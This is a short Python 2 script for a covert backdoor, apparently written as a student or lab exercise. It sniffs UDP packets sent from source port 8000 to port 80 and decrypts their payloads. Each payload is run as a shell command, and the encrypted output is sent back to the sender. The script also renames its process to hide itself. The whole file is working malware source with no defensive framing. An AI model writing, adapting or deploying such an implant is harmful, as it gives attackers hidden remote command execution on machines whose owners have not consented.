import sys, os, argparse, socket, subprocess, logging, time, subprocess, setproctitle
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from AesEncryption import *

def executeShellCommand(command):
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
    return outputString

def parsePacket(receivedPacket):

    command = decrypt(receivedPacket['Raw'].load)
    print "Excuting: " + command
    output = executeShellCommand(command)
    print "Output: " + output

    returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=receivedPacket['UDP'].dport)/encrypt(output)
    time.sleep(0.5)

    print "Sending Packet: "
    print returnPacket.show
    send(returnPacket)

def main():
    setproctitle.setproctitle("notabackdoor.py")
    sniff(filter="udp and (dst port 80) and (src port 8000)", prn=parsePacket)

if __name__ == '__main__':
    main()
